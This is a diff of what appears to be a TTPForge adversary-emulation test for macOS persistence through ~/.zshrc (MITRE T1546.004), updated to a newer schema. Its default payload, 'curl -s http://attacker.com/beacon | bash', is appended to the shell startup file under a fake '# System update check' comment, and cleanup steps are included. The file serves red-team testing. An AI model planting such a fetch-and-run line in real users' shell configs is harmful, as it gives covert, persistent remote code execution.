@@ -1,53 +1,50 @@
+---
 api_version: 2.0
-uuid: 12345678-5555-5555-5555-555555555555
+uuid: cab9e01e-34cf-4f71-991a-321e3bcfb61e
 name: Modify ~/.zshrc
-description: Modifies zsh shell initialization file to execute malicious code on shell startup
-mitre_attack_id: T1156
-mitre_attack_technique: .zshrc
-mitre_attack_tactic: Persistence
-platforms:
-  - darwin
+authors:
+- TTPForge
+description: |
+  Modifies zsh shell initialization file to execute malicious code on shell startup
+mitre:
+  tactics:
+  - TA0003 Persistence
+  techniques:
+  - T1546 Event Triggered Execution
+  subtechniques:
+  - 'T1546.004 Event Triggered Execution: Unix Shell Configuration Modification'
 requirements:
   platforms:
-    - os: darwin
+  - os: darwin
 args:
-  zshrc_path:
-    description: Path to zsh configuration file
-    type: string
-    default: ~/.zshrc
-  backup_path:
-    description: Path to backup the original zshrc
-    type: string
-    default: ~/.zshrc.bak
-  payload_command:
-    description: Command to inject into zshrc
-    type: string
-    default: "curl -s http://attacker.com/beacon | bash"
+- name: zshrc_path
+  description: Path to zsh configuration file
+  type: string
+  default: ~/.zshrc
+- name: backup_path
+  description: Path to backup the original zshrc
+  type: string
+  default: ~/.zshrc.bak
+- name: payload_command
+  description: Command to inject into zshrc
+  type: string
+  default: curl -s http://attacker.com/beacon | bash
 steps:
-  - name: backup_original_zshrc
-    type: shell_command
-    command: "cp {{ zshrc_path }} {{ backup_path }} 2>/dev/null || true"
-  
-  - name: inject_into_zshrc
-    type: shell_command
-    command: |
-      echo "" >> {{ zshrc_path }}
-      echo "# System update check" >> {{ zshrc_path }}
-      echo "{{ payload_command }} &" >> {{ zshrc_path }}
-
-checks:
-  - type: file_exists
-    path: "{{ zshrc_path }}"
-  - type: file_contains
-    path: "{{ zshrc_path }}"
-    value: "{{ payload_command }}"
-
-cleanup:
-  - type: shell_command
-    command: |
-      if [ -f "{{ backup_path }}" ]; then
-        cp {{ backup_path }} {{ zshrc_path }}
-        rm {{ backup_path }}
+- name: backup_original_zshrc
+  inline: cp {{ .Args.zshrc_path }} {{ .Args.backup_path }} 2>/dev/null || true
+- name: inject_into_zshrc
+  inline: |
+    echo "" >> {{ .Args.zshrc_path }}
+    echo "# System update check" >> {{ .Args.zshrc_path }}
+    echo "{{ .Args.payload_command }} &" >> {{ .Args.zshrc_path }}
+  cleanup:
+    inline: |
+      if [ -f "{{ .Args.backup_path }}" ]; then
+        cp {{ .Args.backup_path }} {{ .Args.zshrc_path }}
+        rm {{ .Args.backup_path }}
       else
-        sed -i '' '/# System update check/,+1d' {{ zshrc_path }}
+        sed -i '' '/# System update check/,+1d' {{ .Args.zshrc_path }}
       fi
+tests:
+- name: dry_run_test
+  dry_run: true
